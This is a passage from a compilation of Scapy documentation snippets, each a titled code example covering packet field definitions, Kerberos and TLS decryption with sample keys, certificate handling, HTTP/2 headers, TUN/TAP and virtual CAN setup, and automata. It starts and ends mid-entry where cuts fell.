0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n```\n\n----------------------------------------\n\nTITLE: Implementing Enumeration Fields in Scapy\nDESCRIPTION: Examples of enumeration fields in Scapy, which allow specifying a set of possible values for a field.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\nByteEnumField(\"code\", 4, {1:\"REQUEST\",2:\"RESPONSE\",3:\"SUCCESS\",4:\"FAILURE\"})\n\nEnumField(name, default, enum, fmt = \"H\")\nCharEnumField\nBitEnumField\nShortEnumField\nLEShortEnumField\nByteEnumField\nIntEnumField\nSignedIntEnumField\nLEIntEnumField\nXShortEnumField\n```\n\n----------------------------------------\n\nTITLE: Decrypting Kerberos Authenticator in Scapy\nDESCRIPTION: This code decrypts the Kerberos authenticator using the ticket session key and displays its contents.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\n>>> enc = pkt.root.padata[0].padataValue.armoredData.armor.armorValue.authenticator\n>>> authenticator = enc.decrypt(ticket_session_key)\n>>> authenticator.show()\n###[ KRB_Authenticator ]### \n    authenticatorPvno= 0x5 <ASN1_INTEGER[5]>\n    crealm    = <ASN1_GENERAL_STRING[b'DOM1.LOCAL']>\n    \\cname     \\\n    |###[ PrincipalName ]### \n    |  nameType  = 'NT-PRINCIPAL' 0x1 <ASN1_INTEGER[1]>\n    |  nameString= [<ASN1_GENERAL_STRING[b'SRV$']>]\n    checksumtype= 0x0 <ASN1_INTEGER[0]>\n    checksum  = <ASN1_STRING['']>\n    cusec     = 0x3c <ASN1_INTEGER[60]>\n    ctime     = 2022-07-12 23:54:37 UTC <ASN1_GENERALIZED_TIME['20220712235437Z']>\n    \\subkey    \\\n    |###[ EncryptionKey ]### \n    |  keytype   = 'AES-256' 0x12 <ASN1_INTEGER[18]>\n    |  keyvalue  = <ASN1_STRING[b'%\\xa4n\\xe1\\xd0\\xf5\\x8d\\xc4\\x8d\\xecv\\xe8\\x9c\\xd3\\xc9\\xee\\x1bu\\xc9\\xa5\\xa6\\xf8\\x83f\\x98\\xa1\\xd9\\xe7*I\\x9b\\xf8']>\n    seqNumber = 0x0 <ASN1_INTEGER[0]>\n    encAuthorizationData= None\n```\n\n----------------------------------------\n\nTITLE: Configuring Eddystone URL Beacon with Scapy\nDESCRIPTION: This code sets up a virtual Eddystone URL beacon using Scapy's contrib module. It creates an Eddystone_URL frame for a given URL and builds the advertising data packet to be sent to the BLE controller.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\n# Load the contrib module for Eddystone\nload_contrib('eddystone')\n\n# Eddystone_URL.from_url() builds an Eddystone_URL frame for a given URL.\n#\n# build_set_advertising_data() wraps an Eddystone_Frame into a\n# HCI_Cmd_LE_Set_Advertising_Data payload, that can be sent to the BLE\n# controller.\nbt.sr(Eddystone_URL.from_url(\n  'https://scapy.net').build_set_advertising_data())\n```\n\n----------------------------------------\n\nTITLE: RSA Key Modification\nDESCRIPTION: Demonstrates modifying RSA key version and modulus values.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nprivkey.version = ASN1_INTEGER(1)\nprivkey.modulus.val *= 2\nprivkey.show()\n```\n\n----------------------------------------\n\nTITLE: Loading Server Private Key for Decryption\nDESCRIPTION: Loads the compromised server private key and adds it to the TLS session for decryption\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook3_tls_compromised.ipynb#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nkey = PrivKey('raw_data/pki/srv_key.pem')\nrecord2.tls_session.server_rsa_key = key\n```\n\n----------------------------------------\n\nTITLE: Key Data Equality Check\nDESCRIPTION: Compares wrapped and raw private key data.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\nprivkey.der == keystr\n```\n\n----------------------------------------\n\nTITLE: IPv6 Local Communication Examples\nDESCRIPTION: Examples of IPv6 communication on loopback interface using both Layer 2 and Layer 3 approaches.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/troubleshooting.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n# Layer 3\n>>> sr1(IPv6() / ICMPv6EchoRequest())\n\n# Layer 2\n>>> srp1(Ether() / IPv6() / ICMPv6EchoRequest(), iface=conf.loopback_name)\n```\n\n----------------------------------------\n\nTITLE: Checking p0f Database Configuration in Scapy\nDESCRIPTION: Verifies that the p0f database path is correctly configured in Scapy before using p0f functionality.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_56\n\nLANGUAGE: python\nCODE:\n```\n>>> conf.p0f_base\n```\n\n----------------------------------------\n\nTITLE: Defining Special Fields in Scapy\nDESCRIPTION: Examples of special field types in Scapy, including conditional fields, padding fields, and bit-extended fields.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\nEmph     # Wrapper to emphasize field when printing, e.g. Emph(IPField(\"dst\", \"127.0.0.1\")),\n\nActionField\n\nConditionalField(fld, cond)\n        # Wrapper to make field 'fld' only appear if\n        # function 'cond' evals to True, e.g. \n        # ConditionalField(XShortField(\"chksum\",None),lambda pkt:pkt.chksumpresent==1)\n        # When hidden, it won't be built nor dissected and the stored value will be 'None'\n        \n\nPadField(fld, align, padwith=None)  \n       # Add bytes after the proxified field so that it ends at\n       # the specified alignment from its beginning\n\nBitExtendedField(extension_bit)\n       # Field with a variable number of bytes. Each byte is made of:\n       # - 7 bits of data\n       # - 1 extension bit:\n       #    * 0 means that it is the last byte of the field (\"stopping bit\")\n       #    * 1 means that there is another byte after this one (\"forwarding bit\")\n       # extension_bit is the bit number [0-7] of the extension bit in the byte\n\nMSBExtendedField, LSBExtendedField      # Special cases of BitExtendedField\n```\n\n----------------------------------------\n\nTITLE: Implementing an Automaton Power Supply in Python\nDESCRIPTION: Class definition for a power supply interface that enables communication between an automaton and power source. Uses multiprocessing for thread-safe operation with shared values and pipes.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_41\n\nLANGUAGE: python\nCODE:\n```\nimport logging\nimport sys\nfrom multiprocessing import Value, Pipe\nfrom multiprocessing.sharedctypes import Synchronized\n\nlogging.basicConfig(stream=sys.stdout, level=logging.DEBUG)\n\nclass AutomatonPowerSupply():\n    def __init__(self) -> None:\n        super().__init__()\n        self.logger = logging.getLogger(\"AutomatonPowerSupply\")\n        self.logger.info(\"Init done\")\n        self.voltage_on: Synchronized[int] = Value(\"i\", 0)\n        self.current_noise: Synchronized[int] = Value(\"i\", 0)\n        self.current_on: Synchronized[int] = Value(\"i\", 0)\n        self.delay_off = 0.001\n        self.delay_on = 0.001\n        self.read_pipe, self.write_pipe = Pipe()\n        self.closed = False\n\n    def on(self) -> None:\n        self.logger.debug(\"ON\")\n        with self.voltage_on.get_lock():\n            self.voltage_on.value = 12\n        self.write_pipe.send(b\"1\")\n\n    def off(self) -> None:\n        self.logger.debug(\"OFF\")\n        with self.voltage_on.get_lock():\n            self.voltage_on.value = 0\n        self.write_pipe.send(b\"0\")\n\n    def close(self) -> None:\n        if self.closed:\n            return\n        self.closed = True\n        self.read_pipe.close()\n        self.write_pipe.close()\n\n    def reset(self) -> None:\n        self.off()\n        time.sleep(self.delay_off)\n        self.on()\n        time.sleep(self.delay_on)\n```\n\n----------------------------------------\n\nTITLE: Key Pair Display\nDESCRIPTION: Prints both private and public key components.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\nprint(privkey.key)\nprint(privkey.pubkey)\n```\n\n----------------------------------------\n\nTITLE: Scapy Plot Example\nDESCRIPTION: Sample code demonstrating Scapy's plotting functionality using matplotlib.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> p=sniff(count=50)\n>>> p.plot(lambda x:len(x))\n```\n\n----------------------------------------\n\nTITLE: Certificate Modification and Resignature\nDESCRIPTION: Modifies certificate fields and updates the signature accordingly.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\n# We can quickly modify a certificate field and update the signature accordingly\ncert.tbsCertificate.serialNumber.val = 0xdeadcafe\ncert.tbsCertificate.subject[-1].rdn[0].value.val = 'my new deadcafe CA'    \ncert2 = privkey.resignCert(cert)\ncert2.show()\n```\n\n----------------------------------------\n\nTITLE: Configuring Traceroute Without Filters\nDESCRIPTION: Workaround for traceroute functionality on PPP links by disabling filters.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/troubleshooting.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n>>> traceroute(\"target\", nofilter=1)\n```\n\n----------------------------------------\n\nTITLE: Decrypting Kerberos FAST Request in Scapy\nDESCRIPTION: This snippet demonstrates how to decrypt the Kerberos FAST request using the computed armor key and display its contents.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_25\n\nLANGUAGE: python\nCODE:\n```\n>>> enc = pkt.root.padata[0].padataValue.armoredData.encFastReq\n>>> krbfastreq = enc.decrypt(armorkey)\n>>> krbfastreq.show()\n###[ KrbFastReq ]### \n    fastOptions=  <ASN1_BIT_STRING[0000000000...0000000000]=b'\\x00\\x00\\x00\\x00' (0 unused bit)>\n    \\padata    \\\n    |###[ PADATA ]### \n    |  padataType= 'PA-PAC-REQUEST' 0x80 <ASN1_INTEGER[128]>\n    |  \\padataValue\\\n    |   |###[ PA_PAC_REQUEST ]### \n    |   |  includePac= True <ASN1_BOOLEAN[-1]>\n    |###[ PADATA ]### \n    |  padataType= 'PA-PAC-OPTIONS' 0xa7 <ASN1_INTEGER[167]>\n    |  \\padataValue\\\n    |   |###[ PA_PAC_OPTIONS ]### \n    |   |  options   = Claims <ASN1_BIT_STRING[1000000000...0000000000]=b'\\x80\\x00\\x00\\x00' (0 unused bit)>\n    \\reqBody   \\\n    |###[ KRB_KDC_REQ_BODY ]### \n    |  kdcOptions= forwardable, renewable, canonicalize, renewable-ok <ASN1_BIT_STRING[0100000010...0000010000]=b'@\\x81\\x00\\x10' (0 unused bit)>\n    |  \\cname     \\\n    |   |###[ PrincipalName ]### \n    |   |  nameType  = 'NT-PRINCIPAL' 0x1 <ASN1_INTEGER[1]>\n    |   |  nameString= [<ASN1_GENERAL_STRING[b'adm-0-fastenb']>]\n    |  realm     = <ASN1_GENERAL_STRING[b'DOM1']>\n    |  \\sname     \\\n    |   |###[ PrincipalName ]### \n    |   |  nameType  = 'NT-SRV-INST' 0x2 <ASN1_INTEGER[2]>\n    |   |  nameString= [<ASN1_GENERAL_STRING[b'krbtgt']>, <ASN1_GENERAL_STRING[b'DOM1']>]\n    |  from      = None\n    |  till      = 2037-09-13 02:48:05 UTC <ASN1_GENERALIZED_TIME['20370913024805Z']>\n    |  rtime     = 2037-09-13 02:48:05 UTC <ASN1_GENERALIZED_TIME['20370913024805Z']>\n    |  nonce     = 0x3f58a7a0 <ASN1_INTEGER[1062774688]>\n    |  etype     = [0x12 <ASN1_INTEGER[18]>, 0x11 <ASN1_INTEGER[17]>, 0x17 <ASN1_INTEGER[23]>, 0x18 <ASN1_INTEGER[24]>, -0x87 <ASN1_INTEGER[-135]>, 0x3 <ASN1_INTEGER[3]>]\n    |  \\addresses \\\n    |   |###[ HostAddress ]### \n    |   |  addrType  = 'NetBios' 0x14 <ASN1_INTEGER[20]>\n    |   |  address   = <ASN1_STRING[b'SRV             ']>\n    |  encAuthorizationData= None\n    |  additionalTickets= None\n```\n\n----------------------------------------\n\nTITLE: Finding Authority Header in Dynamic Table for HTTP/2\nDESCRIPTION: Searches for a previously indexed ':authority' header in the dynamic table by name and value. Confirms the index exists using an assertion and prints the found index for debugging.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_35\n\nLANGUAGE: python\nCODE:\n```\nhost_hdr_idx = tblhdr.get_idx_by_name_and_value(':authority', dn)\nassert(not isinstance(host_hdr_idx, type(None)))\nprint(host_hdr_idx)\n```\n\n----------------------------------------\n\nTITLE: Payload Dissection in Python/Scapy\nDESCRIPTION: Core method for dissecting packet payloads based on guessed payload class\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\ndef do_dissect_payload(self, s):\n    cls = self.guess_payload_class(s)\n    p = cls(s, _internal=1, _underlayer=self)\n    self.add_payload(p)\n```\n\n----------------------------------------\n\nTITLE: Visualizing Packet Results\nDESCRIPTION: Creates a matplotlib plot of the packet analysis results, displaying source IP, time, and packet ID information.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/graphs-ipids.ipynb#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n%matplotlib inline\nans.multiplot(lambda p, q: (q[IP].src, (q.time, q[IP].id)), plot_xy=True)\n```\n\n----------------------------------------\n\nTITLE: Certificate Extension Display\nDESCRIPTION: Shows the third extension field from the X.509 certificate.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\ncert.tbsCertificate.extensions[2].show()\n```\n\n----------------------------------------\n\nTITLE: Basic PipeTool Link Example\nDESCRIPTION: Example showing how to link PipeTool components using the low entry channel with CLIFeeder, Drain, and ConsoleSink.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_19\n\nLANGUAGE: pycon\nCODE:\n```\n>>> a = CLIFeeder()\n>>> b = Drain()\n>>> c = ConsoleSink()\n>>> a > b > c\n>>> p = PipeEngine()\n>>> p.add(a)\n```\n\n----------------------------------------\n\nTITLE: X.509 Certificate Loading\nDESCRIPTION: Loads and displays an X.509 certificate and its associated private key.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\n# Let's reload the original key, then let's load a certificate associated with it\nprivkey = RSAPrivateKey(keystr)\ncert = X509_Cert(open('raw_data/pki/ca_cert.der', 'rb').read())\ncert.show()\n```\n\n----------------------------------------\n\nTITLE: Setting Up Scapy Environment in Shell\nDESCRIPTION: Shows how to clone the Scapy repository from GitHub and launch the Scapy interactive shell as root.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://github.com/secdev/scapy --depth=1\nsudo ./run_scapy\n```\n\n----------------------------------------\n\nTITLE: Setting GSS-API Flags in Security Context Initialization\nDESCRIPTION: Shows how to set specific GSS-API flags when calling GSS_Init_sec_context, including extended error, mutual authentication, and confidentiality flags.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/gssapi.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nsspcontext, token, status = clissp.GSS_Init_sec_context(None, None, req_flags=(\n    GSS_C_FLAGS.GSS_C_EXTENDED_ERROR_FLAG |\n    GSS_C_FLAGS.GSS_C_MUTUAL_FLAG |\n    GSS_C_FLAGS.GSS_C_CONF_FLAG  # Asking for CONFIDENTIALITY\n))\n```\n\n----------------------------------------\n\nTITLE: Using Action Parameters in Scapy Automaton\nDESCRIPTION: This example shows how to pass parameters to actions in a Scapy Automaton using the action_parameters function. It demonstrates handling a TCP FIN packet in a state machine.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\nclass Example(Automaton):\n    @ATMT.state()\n    def WAITING(self):\n        pass\n\n    @ATMT.state()\n    def FIN_RECEIVED(self):\n        pass\n\n    @ATMT.receive_condition(WAITING)\n    def is_fin(self, pkt):\n        if pkt[TCP].flags.F:\n            raise self.FIN_RECEIVED().action_parameters(pkt)\n\n    @ATMT.action(is_fin)\n    def send_copy(self, pkt):\n        send(pkt)\n```\n\n----------------------------------------\n\nTITLE: Scapy TLS Layer Loading\nDESCRIPTION: Imports Scapy and loads the TLS protocol layer for certificate handling.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.all import *\nload_layer('tls')\n```\n\n----------------------------------------\n\nTITLE: Initializing TLS Layer in Scapy\nDESCRIPTION: Imports Scapy and loads the TLS layer for packet analysis\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.all import *\nload_layer('tls')\n```\n\n----------------------------------------\n\nTITLE: Field Dissection in Python/Scapy\nDESCRIPTION: Method for dissecting individual fields within a packet layer\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\ndef do_dissect(self, s):\n    flist = self.fields_desc[:]\n    flist.reverse()\n    while s and flist:\n        f = flist.pop()\n        s,fval = f.getfield(self, s)\n        self.fields[f] = fval\n    return s\n```\n\n----------------------------------------\n\nTITLE: Loading TUN Kernel Module on Linux\nDESCRIPTION: Command to load the TUN kernel module on Linux systems. This is a prerequisite for using TUN/TAP interfaces.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/tuntap.rst#2025-04-23_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n# modprobe tun\n```\n\n----------------------------------------\n\nTITLE: Configuring Sphinx Documentation Structure for Scapy\nDESCRIPTION: This snippet defines the structure of Scapy's documentation using Sphinx directives. It sets up the main table of contents, organizes content into sections, and includes metadata such as version and license information.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/index.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. Scapy documentation master file, created by sphinx-quickstart on Mon Sep  8 19:37:39 2008.\n   You can adapt this file completely to your liking, but it should at least\n   contain the root `toctree` directive.\n\nWelcome to Scapy's documentation!\n=================================\n\n.. image:: graphics/scapy_logo.png\n   :scale: 20\n   :align: center\n\n:Version: |version|\n:Release: |release|\n:Date: |today|\n\nScapy's documentation is under a `Creative Commons Attribution - Non-Commercial \n- Share Alike 2.5 <http://creativecommons.org/licenses/by-nc-sa/2.5/>`_ license.\n\n.. toctree::\n   :maxdepth: 2\n   :caption: General documentation\n   \n   introduction\n   installation\n   \n   usage\n   advanced_usage\n   routing\n\n.. toctree::\n   :maxdepth: 2\n   :caption: Extend scapy\n\n   extending\n   build_dissect\n   functions\n\n.. toctree::\n   :maxdepth: 2\n   :caption: Layer-specific documentation\n   :glob:\n\n   layers/index.rst\n\n.. toctree::\n   :maxdepth: 2\n   :caption: About\n\n   troubleshooting\n   development\n   backmatter\n\n.. only:: html\n\n    .. toctree::\n       :maxdepth: 1\n       :titlesonly:\n       :caption: API Reference\n\n       api/scapy.rst\n```\n\n----------------------------------------\n\nTITLE: Documenting Scapy Contrib Module Metadata in Python\nDESCRIPTION: Defines the required metadata for Scapy contrib modules. This information is used by the explore() function to provide searchable details about the module. The metadata should be placed near the top of the file, below the license header.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_23\n\nLANGUAGE: python\nCODE:\n```\n# scapy.contrib.description = [...]\n# scapy.contrib.status = [...]\n# scapy.contrib.name = [...] (optional)\n```\n\n----------------------------------------\n\nTITLE: Finding Accept-Language Header in Dynamic Table for HTTP/2\nDESCRIPTION: Searches for a previously indexed 'accept-language' header with the value 'fr-FR' in the dynamic table. Prints the index for verification before creating the actual header.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_39\n\nLANGUAGE: python\nCODE:\n```\nacceptlang_hdr_idx = tblhdr.get_idx_by_name_and_value('accept-language', 'fr-FR')\nprint(acceptlang_hdr_idx)\n```\n\n----------------------------------------\n\nTITLE: Importing Scapy in iPython\nDESCRIPTION: Demonstrates how to import all Scapy functions in an iPython environment.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.all import *\n```\n\n----------------------------------------\n\nTITLE: Spawning DCERPC Server with TCP Transport in Python using Scapy\nDESCRIPTION: This code snippet shows how to spawn a DCERPC server using TCP transport, listening on port 12345.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/dcerpc.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nMyRPCServer.spawn(\n    DCERPC_Transport.NCACN_IP_TCP,\n    port=12345,\n)\n```\n\n----------------------------------------\n\nTITLE: Configuring TUN Interface on BSD and macOS\nDESCRIPTION: Shell commands to bring up the TUN interface and assign IP addresses on BSD and macOS systems.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/tuntap.rst#2025-04-23_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nsudo ifconfig tun0 up\nsudo ifconfig tun0 192.0.2.1 192.0.2.2\n```\n\n----------------------------------------\n\nTITLE: Pinging Scapy's TUN Interface\nDESCRIPTION: Shell command to ping the Scapy-managed TUN interface and view the results.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/tuntap.rst#2025-04-23_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n$ ping -c 3 192.0.2.2\nPING 192.0.2.2 (192.0.2.2): 56 data bytes\n64 bytes from 192.0.2.2: icmp_seq=0 ttl=64 time=2.414 ms\n64 bytes from 192.0.2.2: icmp_seq=1 ttl=64 time=3.927 ms\n64 bytes from 192.0.2.2: icmp_seq=2 ttl=64 time=5.740 ms\n\n--- 192.0.2.2 ping statistics ---\n3 packets transmitted, 3 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 2.414/4.027/5.740/1.360 ms\n```\n\n----------------------------------------\n\nTITLE: Python File Reading Anti-Pattern Example\nDESCRIPTION: Shows the discouraged way of reading files that creates unnecessary list objects and consumes more memory.\nSOURCE: https://github.com/secdev/scapy/blob/master/CONTRIBUTING.md#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nfor line in fdesc.readlines()\n```\n\n----------------------------------------\n\nTITLE: Creating an Accept-Language Indexed Header for HTTP/2\nDESCRIPTION: Creates an HTTP/2 accept-language header using the HPack indexed header field format. Uses the previously found index from the dynamic table and appends the header to the headers frame.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_40\n\nLANGUAGE: python\nCODE:\n```\nacceptlang_hdr = h2.HPackIndexedHdr(index = acceptlang_hdr_idx)\nacceptlang_hdr.show()\nhdrs_frm.payload.hdrs.append(acceptlang_hdr)\n```\n\n----------------------------------------\n\nTITLE: Scapy Nmap Fingerprinting Example\nDESCRIPTION: Demonstrates network fingerprinting using Nmap integration.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\n>>> load_module(\"nmap\")\n>>> nmap_fp(\"192.168.0.1\")\n```\n\n----------------------------------------\n\nTITLE: Cannelloni Virtual CAN Setup\nDESCRIPTION: Shell commands for setting up virtual CAN interfaces and configuring them with traffic control (tc) for use with the Cannelloni framework.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_48\n\nLANGUAGE: bash\nCODE:\n```\nmodprobe vcan\n\nip link add name vcan0 type vcan\nip link add name vcan1 type vcan\n\nip link set dev vcan0 up\nip link set dev vcan1 up\n\ntc qdisc add dev vcan0 root tbf rate 300kbit latency 100ms burst 1000\ntc qdisc add dev vcan1 root tbf rate 300kbit latency 100ms burst 1000\n\ncannelloni -I vcan0 -R <remote-IP> -r 20000 -l 20000 &\ncannelloni -I vcan1 -R <remote-IP> -r 20001 -l 20001 &\n```\n\n----------------------------------------\n\nTITLE: Signature Value Display\nDESCRIPTION: Shows the certificate's signature value.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\ncert.signatureValue\n```\n\n----------------------------------------\n\nTITLE: Configuring reStructuredText TOC Tree for Layer Documentation\nDESCRIPTION: Sets up a table of contents tree (toctree) directive that recursively includes all documentation files in the current directory. Uses glob pattern matching and displays only titles.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/index.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. toctree::\n   :glob:\n   :titlesonly:\n   \n   *\n```\n\n----------------------------------------\n\nTITLE: Generating UML Diagram for DHCP Layer and ansmachine Module\nDESCRIPTION: This command uses pyreverse to generate UML diagrams showing the dependencies between the DHCP layer, ansmachine module, and packet module in Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\npyreverse -o png -p dhcp_ans scapy/ansmachine.py scapy/layers/dhcp.py scapy/packet.py\n```\n\n----------------------------------------\n\nTITLE: Custom ConsoleSink Implementation\nDESCRIPTION: Simple implementation of a ConsoleSink class that prints messages received on both low and high channels with different prefixes.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_18\n\nLANGUAGE: python3\nCODE:\n```\nclass ConsoleSink(Sink):\n    def push(self, msg):\n        print(\">%r\" % msg)\n    def high_push(self, msg):\n        print(\">>%r\" % msg)\n```\n\n----------------------------------------\n\nTITLE: UTScapy Test Campaign Format - Python\nDESCRIPTION: Example showing the structure of a UTScapy test campaign including test sets, unit tests, and Python statements.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/development.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n% Test Campaign Name\n* Comment describing this campaign\n\n+ Test Set 1\n* comments for test set 1\n\n= Unit Test 1\n~ keywords\n* Comments for unit test 1\n# Python statements follow\na = 1\nprint a\na == 1\n```\n\n----------------------------------------\n\nTITLE: DownDrain Channel Connection Example\nDESCRIPTION: Example showing how to use DownDrain to connect high channel messages to lower channel components.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_21\n\nLANGUAGE: pycon\nCODE:\n```\n>>> a2 = CLIHighFeeder()\n>>> b2 = DownDrain()\n>>> a2 >> b2\n>>> b2 > b\n>>> a2.send(\"hello\")\n```\n\n----------------------------------------\n\nTITLE: Describing Documentation Templates for Scapy in Markdown\nDESCRIPTION: This markdown snippet outlines the contents of a folder containing templates used to generate Scapy's documentation. It specifically mentions the inclusion of apidoc templates inherited from the Sphinx project's GitHub repository.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/_templates/README.md#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n# Doc templates\n\nThis folder contains templates used to generate Scapy's doc. It contains:\n\n- apidoc templates: inherited from\n  https://github.com/sphinx-doc/sphinx/blob/master/sphinx/templates/apidoc/\n```\n\n----------------------------------------\n\nTITLE: Scapy Debug Configuration Example\nDESCRIPTION: Shows how to enable debugging options for the dissector when troubleshooting test failures in CI environments.\nSOURCE: https://github.com/secdev/scapy/blob/master/CONTRIBUTING.md#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nconf.debug_dissector = 1\n```\n\n----------------------------------------\n\nTITLE: VSOMEIP Setup Commands\nDESCRIPTION: Shell commands for setting up VSOMEIP library on a Raspberry Pi, including downloading, patching, and building steps.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_47\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/GENIVI/vsomeip.git\ncd vsomeip\nwget -O 0001-Support-boost-v1.66.patch.zip \\\nhttps://github.com/GENIVI/vsomeip/files/2244890/0001-Support-boost-v1.66.patch.zip\nunzip 0001-Support-boost-v1.66.patch.zip\ngit apply 0001-Support-boost-v1.66.patch\nmkdir build\ncd build\ncmake -DENABLE_SIGNAL_HANDLING=1 ..\nmake\nmake install\n```\n\n----------------------------------------\n\nTITLE: Handling Compressed Binary Data in Python\nDESCRIPTION: This code snippet shows a gzip-compressed binary data structure used in the Scapy networking library. The data includes control characters, protocol information, and binary fields that are likely used for packet construction or testing.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_47\n\nLANGUAGE: python\nCODE:\n```\ndata      = 